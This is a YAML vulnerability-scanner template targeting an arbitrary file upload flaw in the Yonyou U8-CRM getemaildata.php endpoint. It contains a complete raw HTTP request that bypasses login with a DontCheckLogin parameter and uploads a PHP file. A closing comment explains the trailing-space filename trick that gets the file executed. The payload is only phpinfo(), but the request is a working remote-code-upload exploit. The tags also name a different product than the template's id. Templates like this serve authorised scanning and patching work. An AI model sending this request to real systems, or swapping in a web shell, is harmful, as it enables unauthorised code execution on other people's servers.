id: yongyouOA-U8-CRM-getemaildata-php-file-upload

info:
  name: 用友U8-CRM客户关系管理系统getemaildata.php任意文件上传漏洞
  author: cnaq 
  severity: critical
  description: 用友U8-CRM客户关系管理系统getemaildata.php任意文件上传漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fgetemaildata.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: wanhu,OA,file,upload

requests:
  - raw:
      - |
        POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ
        Content-Length: 517

        ------WebKitFormBoundarykS5RKgl8t3nwInMQ
        Content-Disposition: form-data; name="file"; filename="test.php "
        Content-Type: text/plain

        <?php phpinfo();?>
        ------WebKitFormBoundarykS5RKgl8t3nwInMQ

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'success'
          - 'true'

# 上传包中文件的名称后要添加一个空格，不然上传之后不会解析。详细看参考链接